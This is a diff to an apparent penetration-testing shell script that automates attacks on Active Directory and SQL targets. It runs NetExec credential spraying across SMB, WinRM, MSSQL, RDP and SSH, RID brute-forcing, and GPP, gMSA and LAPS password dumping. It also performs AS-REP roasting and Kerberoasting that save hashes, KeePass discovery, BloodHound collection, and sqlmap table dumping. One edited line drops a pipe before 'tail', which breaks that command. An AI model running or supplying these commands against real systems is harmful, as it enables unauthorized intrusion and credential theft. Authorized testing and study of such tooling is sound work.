@@ -41,7 +41,7 @@ netscan() {
     fi
 
     # Set a trap to clean up temporary files on exit
-    #trap "rm -f *.tmp" EXIT INT
+    trap "echo ''" EXIT INT
     
     # Host Discovery
     if [[ -f "$input" ]]; then
@@ -362,7 +362,7 @@ testcreds() {
     fi
 
     # Set a trap to clean up temporary files on exit
-    #trap "rm -f *.tmp" EXIT INT
+    trap "echo ''" EXIT INT
 
     if [[ $3 == "-f" ]]; then
         file=$4
@@ -392,19 +392,19 @@ testcreds() {
 
         echo -e "\033[1;33m[!] Testing $user's credentials with NetExec\033[0m"
         echo -e '\033[0;34m[*] Trying SMB... \033[0m'
-        nxc smb $(echo "$nxc_auth") | grep --color=never + | highlight red "(Pwn3d!)"
-        nxc smb $(echo "$nxc_auth") --local-auth | grep --color=never + | awk '{print $0 " (local auth)"}' | highlight red "(Pwn3d!)"
+        nxc smb $(echo "$nxc_auth") 2>/dev/null | grep --color=never + | highlight red "(Pwn3d!)"
+        nxc smb $(echo "$nxc_auth") --local-auth 2>/dev/null | grep --color=never + | awk '{print $0 " (local auth)"}' | highlight red "(Pwn3d!)"
         echo -e '\033[0;34m[*] Trying WinRM... \033[0m'
-        nxc winrm $(echo "$nxc_auth") | grep --color=never + | highlight red "(Pwn3d!)"
-        nxc winrm $(echo "$nxc_auth") --local-auth | grep --color=never + | awk '{print $0 " (local auth)"}' | highlight red "(Pwn3d!)"
+        nxc winrm $(echo "$nxc_auth") 2>/dev/null | grep --color=never + | highlight red "(Pwn3d!)"
+        nxc winrm $(echo "$nxc_auth") --local-auth 2>/dev/null | grep --color=never + | awk '{print $0 " (local auth)"}' | highlight red "(Pwn3d!)"
         echo -e '\033[0;34m[*] Trying MS-SQL... \033[0m'
-        nxc mssql $(echo "$nxc_auth") | grep --color=never + | highlight red "(Pwn3d!)"
-        nxc mssql $(echo "$nxc_auth") --local-auth | grep --color=never + | awk '{print $0 " (local auth)"}' | highlight red "(Pwn3d!)"
+        nxc mssql $(echo "$nxc_auth") 2>/dev/null | grep --color=never + | highlight red "(Pwn3d!)"
+        nxc mssql $(echo "$nxc_auth") --local-auth 2>/dev/null | grep --color=never + | awk '{print $0 " (local auth)"}' | highlight red "(Pwn3d!)"
         echo -e '\033[0;34m[*] Trying RDP... \033[0m'
-        nxc rdp $(echo "$nxc_auth") | grep --color=never + | highlight red "(Pwn3d!)"
-        nxc rdp $(echo "$nxc_auth") --local-auth | grep --color=never + | awk '{print $0 " (local auth)"}' | highlight red "(Pwn3d!)"
+        nxc rdp $(echo "$nxc_auth") 2>/dev/null | grep --color=never + | highlight red "(Pwn3d!)"
+        nxc rdp $(echo "$nxc_auth") --local-auth 2>/dev/null | grep --color=never + | awk '{print $0 " (local auth)"}' | highlight red "(Pwn3d!)"
         echo -e '\033[0;34m[*] Trying SSH... \033[0m'
-        nxc ssh $(echo "$nxc_auth") | grep --color=never + | highlight red "(Pwn3d!)"
+        nxc ssh $(echo "$nxc_auth") 2>/dev/null | grep --color=never + | highlight red "(Pwn3d!)"
         
     done < auth.tmp
 
@@ -441,14 +441,14 @@ enumdomain() {
     #end debug    
 
     # Set a trap to clean up temporary files on exit
-    #trap "rm -f *.tmp" EXIT INT
+    trap "echo ''" EXIT INT
     
     echo "\033[1;36m[?] Bruteforce RIDs? [y/N]\033[0m"
     read -s -q confirm
     if [[ $confirm =~ ^[Yy]$ ]]; then
       echo "\033[1;33m[!] Enumerating all users with RID Bruteforcing \033[0m"
       echo "\033[0;34m[>] nxc smb $(echo "$nxc_auth") --rid-brute 5000 \033[0m"
-      nxc smb $(echo "$nxc_auth") --rid-brute 5000 | grep SidTypeUser | cut -d ':' -f2 | cut -d '\' -f2 | cut -d ' ' -f1 | tee users.list
+      nxc smb $(echo "$nxc_auth") --rid-brute 5000 2>/dev/null | grep SidTypeUser | cut -d ':' -f2 | cut -d '\' -f2 | cut -d ' ' -f1 | tee users.list
       echo '\033[0;34m[*] Saving enumerated users to ./users.list'
     fi
     
@@ -457,63 +457,63 @@ enumdomain() {
     if [[ $confirm =~ ^[Yy]$ ]]; then
       echo "\033[1;33m[!] Enumerating groups \033[0m"
       echo "\033[0;34m[>] nxc smb $(echo "$nxc_auth") --groups \033[0m"
-      nxc smb $(echo "$nxc_auth") --groups | grep 'membercount' | tr -s " " | cut -d ' ' -f 5- | grep -v 'membercount: 0' | sed "s/membercount:/-/g"   
+      nxc smb $(echo "$nxc_auth") --groups 2>/dev/null | grep 'membercount' | tr -s " " | cut -d ' ' -f 5- | grep -v 'membercount: 0' | sed "s/membercount:/-/g"   
     fi
     
     
     echo "\033[1;33m[!] Enumerating privileged users with NetExec \033[0m"
     echo "\033[0;34m[>] nxc ldap $(echo "$nxc_auth") --admin-count \033[0m"
-    nxc ldap $(echo "$nxc_auth") --admin-count | grep -v '\[.\]' | tr -s " " | cut -d ' ' -f 5
+    nxc ldap $(echo "$nxc_auth") --admin-count 2>/dev/null | grep -v '\[.\]' | tr -s " " | cut -d ' ' -f 5
     
     echo "\033[1;33m[!] Enumerating user descriptions with NetExec \033[0m"
     echo "\033[0;34m[>] nxc ldap $(echo "$nxc_auth") -M user-desc \033[0m"
-    nxc ldap $(echo "$nxc_auth") -M user-desc | grep --color=never -o "User:.*"
+    nxc ldap $(echo "$nxc_auth") -M user-desc 2>/dev/null | grep --color=never -o "User:.*"
     
     echo "\033[1;33m[!] Searching for PKI Enrollment Services with NetExec \033[0m"
     echo "\033[0;34m[>] nxc ldap $(echo "$nxc_auth") -M adcs \033[0m"
-    nxc ldap $(echo "$nxc_auth") -M adcs | grep ADCS | tr -s " " | cut -d ' ' -f 6-
+    nxc ldap $(echo "$nxc_auth") -M adcs 2>/dev/null | grep ADCS | tr -s " " | cut -d ' ' -f 6-
     
     echo "\033[1;33m[!] Enumerating trust relationships with NetExec \033[0m"
     echo "\033[0;34m[>] xc ldap $(echo "$nxc_auth") -M enum_trusts \033[0m"
-    nxc ldap $(echo "$nxc_auth") -M enum_trusts | grep ENUM_TRUSTS | tr -s " " | cut -d ' ' -f 6-
+    nxc ldap $(echo "$nxc_auth") -M enum_trusts 2>/dev/null | grep ENUM_TRUSTS | tr -s " " | cut -d ' ' -f 6-
     
     echo "\033[1;33m[!] Enumerating MachineAccountQuota \033[0m"
     echo "\033[0;34m[>] nxc ldap $(echo "$nxc_auth") -M maq \033[0m"
-    nxc ldap $(echo "$nxc_auth") -M maq | grep -oE "MachineAccountQuota: .*"
+    nxc ldap $(echo "$nxc_auth") -M maq 2>/dev/null | grep -oE "MachineAccountQuota: .*"
     
     echo "\033[1;33m[!] Enumerating delegation rights with Impacket \033[0m"
     echo "\033[0;34m[>] findDelegation.py $(echo "$imp_auth") \033[0m"
-    findDelegation.py $(echo "$imp_auth") | grep --color=never "\S" | tail -n +2
+    findDelegation.py $(echo "$imp_auth") 2>/dev/null | grep --color=never "\S" | tail -n +2
     
     echo "\033[1;33m[!] Enumerating DCSync rights with NetExec \033[0m"  
     local domain1=$(echo $domain | cut -d '.' -f 1)
     local domain2=$(echo $domain | cut -d '.' -f 2)
     echo "\033[0;34m[>] nxc ldap $(echo "$nxc_auth")  -M daclread -o TARGET_DN="DC=$domain1,DC=$domain2" ACTION=read RIGHTS=DCSync \033[0m"
-    nxc ldap $(echo "$nxc_auth")  -M daclread -o TARGET_DN="DC=$domain1,DC=$domain2" ACTION=read RIGHTS=DCSync | grep "Trustee" | cut -d ":" -f 2 | sed 's/^[[:space:]]*//'
+    nxc ldap $(echo "$nxc_auth")  -M daclread -o TARGET_DN="DC=$domain1,DC=$domain2" ACTION=read RIGHTS=DCSync 2>/dev/null | grep "Trustee" | cut -d ":" -f 2 | sed 's/^[[:space:]]*//'
     
     echo "\033[1;33m[!] Searching for credentials in the GPO with NetExec \033[0m"
     echo "\033[0;34m[>] nxc smb $(echo "$nxc_auth") -M gpp_password -M gpp_autologin \033[0m"
-    nxc smb $(echo "$nxc_auth") -M gpp_password | grep -aioE "Found credentials .*|userName: .*|Password: .*" --color=never
-    nxc smb $(echo "$nxc_auth") -M gpp_autologin | grep -aioE "\Found credentials .*|Usernames: .*|Passwords: .*" --color=never
+    nxc smb $(echo "$nxc_auth") -M gpp_password 2>/dev/null | grep -aioE "Found credentials .*|userName: .*|Password: .*" --color=never
+    nxc smb $(echo "$nxc_auth") -M gpp_autologin 2>/dev/null | grep -aioE "\Found credentials .*|Usernames: .*|Passwords: .*" --color=never
     
     echo "\033[1;33m[!] Enumerating PASSWD_NOTREQD with NetExec \033[0m" 
     echo "\033[0;34m[>] nxc ldap $(echo "$nxc_auth") --password-not-required \033[0m"
-    nxc ldap $(echo "$nxc_auth") --password-not-required | grep --color=never -ao "User:.*"
+    nxc ldap $(echo "$nxc_auth") --password-not-required 2>/dev/null | grep --color=never -ao "User:.*"
     
     echo "\033[1;33m[!] Enumerating pre-Win2k computer accounts\033[0m"
     echo "\033[0;34m[>] pre2k unauth -d $domain -dc-ip $dc_ip -inputfile users.list \033[0m"
-    pre2k unauth -d $domain -dc-ip $dc_ip -inputfile users.list | grep -ioE "VALID CREDENTIALS: .*" --color=never
+    pre2k unauth -d $domain -dc-ip $dc_ip -inputfile users.list 2>/dev/null | grep -ioE "VALID CREDENTIALS: .*" --color=never
     
     echo "\033[1;33m[!] Enumerating AS-REProastable users with Impacket \033[0m"
     echo "\033[0;34m[>] GetNPUsers.py $(echo "$imp_auth") -request \033[0m"
-    GetNPUsers.py $(echo "$imp_auth") | grep --color=never "\S" | tail -n +4 | awk {'print $1'}
+    GetNPUsers.py $(echo "$imp_auth") 2>/dev/null | grep --color=never "\S" | tail -n +4 | awk {'print $1'}
     GetNPUsers.py $(echo "$imp_auth") -request -outputfile asrep.hash 1>/dev/null
     echo '\033[0;34m[*] Saving hashes (if any) to ./asrep.hash \033[0m'
     
     echo "\033[1;33m[!] Enumerating Kerberoastable users with Impacket \033[0m"
     echo "\033[0;34m[>] GetUserSPNs.py $(echo "$imp_auth") -request \033[0m"
-    GetUserSPNs.py $(echo "$imp_auth") | grep --color=never "\S" | tail -n +4 | awk {'print $2 " ||| "$1'} | column -s "|||" -t
-    GetUserSPNs.py $(echo "$imp_auth") -request -outputfile kerb.hash 1>/dev/null
+    GetUserSPNs.py $(echo "$imp_auth") 2>/dev/null | grep --color=never "\S" | tail -n +4 | awk {'print $2 " ||| "$1'} | column -s "|||" -t
+    GetUserSPNs.py $(echo "$imp_auth") -request -outputfile kerb.hash >/dev/null 2>&1
     echo '\033[0;34m[*] Saving hashes (if any) to ./kerb.hash \033[0m'
         
     echo "\033[1;36m[?] Ingest data for Bloodhound? [y/N] \033[0m"
@@ -522,7 +522,7 @@ enumdomain() {
       echo "\033[1;33m[!] Ingesting AD data \033[0m"
       echo "\033[0;34m[*] Collection set to 'All'. Grab yourself a cup of coffee, this might take a wee while. \033[0m"
       echo "\033[0;34m[>] bloodhound-python $(echo "$blood_auth") -ns $dc_ip -d $domain -c all --zip \033[0m"
-      bloodhound-python $(echo "$blood_auth") -ns $dc_ip -d $domain -c all --zip | grep -oE [0-9]*_bloodhound\.zip > path.tmp
+      bloodhound-python $(echo "$blood_auth") -ns $dc_ip -d $domain -c all --zip 2>/dev/null | grep -oE [0-9]*_bloodhound\.zip > path.tmp
       mv $(cat path.tmp) ./${domain}_bloodhound.zip
       echo "\033[0;34m[*] Saving data to ./${domain}_bloodhound.zip"
       rm path.tmp
@@ -547,8 +547,8 @@ enumuser() {
         return 1
     fi
 
-    # Set a trap to clean up temporary files on exit
-    #trap "rm -f *.tmp" EXIT INT 
+    # Set a trap to make each step skippable
+    trap "echo ''" EXIT INT  
     
     get_auth $@
     if [[ $? -eq 2 ]]; then
@@ -562,21 +562,21 @@ enumuser() {
                                                    
     echo -e "\033[1;33m[!] Enumerating $user's groups \033[0m"
     echo -e "\033[0;34m[>] nxc ldap $(echo "$nxc_auth") -M groupmembership -o USER="$user" \033[0m"
-    nxc ldap $(echo "$nxc_auth") -M groupmembership -o USER="$user" | tail -n +4 | tr -s " " | cut -d " " -f 5-
+    nxc ldap $(echo "$nxc_auth") -M groupmembership -o USER="$user" 2>/dev/null | tail -n +4 | tr -s " " | cut -d " " -f 5-
     
     echo "\033[1;33m[!] Trying to dump gMSA passwords with NetExec \033[0m"
     echo "\033[0;34m[>] nxc ldap $(echo "$nxc_auth") --gmsa \033[0m"
-    nxc ldap $(echo "$nxc_auth") --gmsa | grep -aoE "Account:.*" --color=never
+    nxc ldap $(echo "$nxc_auth") --gmsa 2>/dev/null | grep -aoE "Account:.*" --color=never
     
     echo "\033[1;33m[!] Trying to dump LAPS passwords with NetExec \033[0m"
     echo "\033[0;34m[>] nxc ldap $(echo "$nxc_auth") -M laps / --laps --dpapi \033[0m"
-    nxc ldap $(echo "$nxc_auth") -M laps | tail -n +4 | tr -s " " | cut -d " " -f 6-
-    nxc smb $(echo "$nxc_auth") --laps --dpapi | tail -n +4 | tr -s " " | cut -d " " -f 6-
+    nxc ldap $(echo "$nxc_auth") -M laps 2>/dev/null  tail -n +4 | tr -s " " | cut -d " " -f 6-
+    nxc smb $(echo "$nxc_auth") --laps --dpapi 2>/dev/null | tail -n +4 | tr -s " " | cut -d " " -f 6-
     
     
     echo "\033[1;33m[!] Trying to find KeePass files with NetExec \033[0m"
     echo "\033[0;34m[>] nxc smb $(echo "$nxc_auth") -M keepass_discover \033[0m"
-    nxc smb $(echo "$nxc_auth") -M keepass_discover | grep -aoE "Found .*" --color=never
+    nxc smb $(echo "$nxc_auth") -M keepass_discover 2>/dev/null | grep -aoE "Found .*" --color=never
     
  
     echo "\033[1;31m[*] Done. \033[0m"
@@ -668,54 +668,65 @@ enumsql() {
         return 1
     fi
 
-    # Set a trap to clean up temporary files on exit
-    #trap "rm -f *.tmp" EXIT INT 
+    # Set a trap to make each step skippable
+    trap "echo ''" EXIT INT 
     
     sqlmap $@ --batch | grep "Type:" > sqlmap.tmp
     if [[ $(grep -c "time-based" sqlmap.tmp) -eq 1 ]]; then
         echo "\033[1;31m[*] Time-based injection -- this might take a while. \033[0m"
-    fi                               
+    fi
+
     echo "\033[1;33m[!] Grabbing database banner \033[0m"
     echo "\033[0;34m[>] sqlmap $@ --banner --batch  \033[0m"  
-    sqlmap $@ --banner --batch | grep -E --color=never "technology:|DBMS:|banner:|system:"
+    sqlmap $@ --banner --batch 2>/dev/null | grep -E --color=never "technology:|DBMS:|banner:|system:"
     echo "\033[1;33m[!] Fetching current user \033[0m"
     echo "\033[0;34m[>] sqlmap $@ --current-user --batch \033[0m"
-    sqlmap $@ --current-user --batch| grep -oP --color=never "(?<=current user: ').*(?=')"
+    sqlmap $@ --current-user --batch 2>/dev/null | grep -oP --color=never "(?<=current user: ').*(?=')"
     echo "\033[1;33m[!] Is current user database admin? \033[0m"
     echo "\033[0;34m[>] sqlmap $@ --is-dba --batch \033[0m"
-    sqlmap $@ --is-dba --batch| grep -oP --color=never "(?<=DBA: ).*" | highlight red "True" 
+    sqlmap $@ --is-dba --batch 2>/dev/null | grep -oP --color=never "(?<=DBA: ).*" | highlight red "True" 
     echo "\033[1;33m[!] Fetching current user's privileges \033[0m"
     echo "\033[0;34m[>] sqlmap $@ --privileges --batch \033[0m"
-    sqlmap $@ --privileges --batch| grep -oP --color=never "(?<=privilege: ').*(?=')"
+    sqlmap $@ --privileges --batch 2>/dev/null | grep -oP --color=never "(?<=privilege: ').*(?=')"
+    
+    echo "\033[1;36m[*] Beginning schema enumeration. Don't skip these steps! \033[0m"
     echo "\033[1;33m[!] Fetching current database \033[0m"
     echo "\033[0;34m[>] sqlmap $@ --current-db --batch \033[0m"
-    sqlmap $@ --current-db --batch| grep -oP --color=never "(?<=current database: ').*(?=')"| tee db.tmp
+    sqlmap $@ --current-db --batch 2>/dev/null | grep -oP --color=never "(?<=current database: ').*(?=')"| tee db.txt
     echo "\033[1;33m[!] Fetching tables \033[0m"
-    echo "\033[0;34m[>] sqlmap $@ -D $(cat db.tmp) --tables --batch \033[0m"
-    sqlmap $@ -D $(cat db.tmp) --tables --batch | grep -oP --color=never "(?<=\| ).*(?= \|)" | tail -n +2 | tee tables.tmp
+    echo "\033[0;34m[>] sqlmap $@ -D $(cat db.txt) --tables --batch \033[0m"
+    sqlmap $@ -D $(cat db.txt) --tables --batch 2>/dev/null | grep -oP --color=never "(?<=\| ).*(?= \|)" | tail -n +2 | tee tables.txt
     
-    echo "\033[1;36m[?] Retrieve tables' schema? [y/N] \033[0m"
+    echo "\033[1;36m[?] Enter the tables you are interested in, separated by commas: \033[0m"
+    read selected_tables    
+    if [[ -z "$selected_tables" ]]; then
+        echo "\033[1;31m[*] No tables selected. Exiting. \033[0m"
+        return
+    fi
+    echo "$selected_tables" | tr ',' '\n' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//' > selected_tables.tmp
+
+    echo "\033[1;36m[?] Retrieve selected tables' schema? [y/N] \033[0m"
     read -s -q confirm
-      if [[ $confirm =~ ^[Yy]$ ]]; then    
-        echo "\033[1;33m[!] Retrieving schema \033[0m"
-        echo "\033[0;34m[>] sqlmap $@ -D $(cat db.tmp) --schema --batch \033[0m"
-        sqlmap $@ -D $(cat db.tmp) --schema --batch | tail -n +10 | grep --color=never -P "Database: .*|Table: .*|^\+\-*|\|\s.*"
-      fi
+    if [[ $confirm =~ ^[Yy]$ ]]; then
+        while read -r table; do
+            echo "\033[1;33m[!] Retrieving $table's schema \033[0m"
+            echo "\033[0;34m[>] sqlmap $@ -D $(cat db.txt) -T \"$table\" --schema --batch \033[0m"
+            sqlmap $@ -D $(cat db.txt) -T "$table" --schema --batch 2>/dev/null | tail -n +10 | grep --color=never -P "Table: .*|^\+\-*|\|\s.*"
+        done < selected_tables.tmp    
+    fi
     
-    while read -r table
-      do  
-        echo "$table" > tbl.tmp 
-        echo "\033[1;36m[?] Do you want to dump table \"$table\"? [y/N] \033[0m"
-        read -s -q confirm
-        if [[ $confirm =~ ^[Yy]$ ]]; then
-             
-          echo "\033[1;33m[!] Dumping table's contents \033[0m"
-          echo "\033[0;34m[>] sqlmap $@ -D $(cat db.tmp) -T $(cat tbl.tmp) --dump --batch \033[0m"
-          sqlmap $@ -D $(cat db.tmp) -T $(cat tbl.tmp) --dump --batch | tail -n +10 | grep --color=never -P "Database: .*|Table: .*|^\+\-*|\|\s.*" | tail -n +3
-        fi
-      done < tables.tmp
-      rm *.tmp
-      echo "\033[1;31m[*] Done. \033[0m"
+    echo "\033[1;36m[?] Dump selected tables? [Y/N] \033[0m"
+    read -s -q confirm
+    if [[ -z "$confirm" || $confirm =~ ^[Yy]$ ]]; then
+        while read -r table; do
+            echo "\033[1;33m[!] Dumping $table's contents \033[0m"
+            echo "\033[0;34m[>] sqlmap $@ -D $(cat db.txt) -T \"$table\" --dump --batch \033[0m"
+            sqlmap $@ -D $(cat db.txt) -T "$table" --dump --batch 2>/dev/null | tail -n +10 | grep --color=never -P "Database: .*|Table: .*|^\+\-*|\|\s.*" | tail -n +3  
+        done < selected_tables.tmp            
+    fi
+    rm selected_tables.tmp
+
+    echo "\033[1;31m[*] Done. \033[0m"
 }
 
 #              _                   _          __  __ 
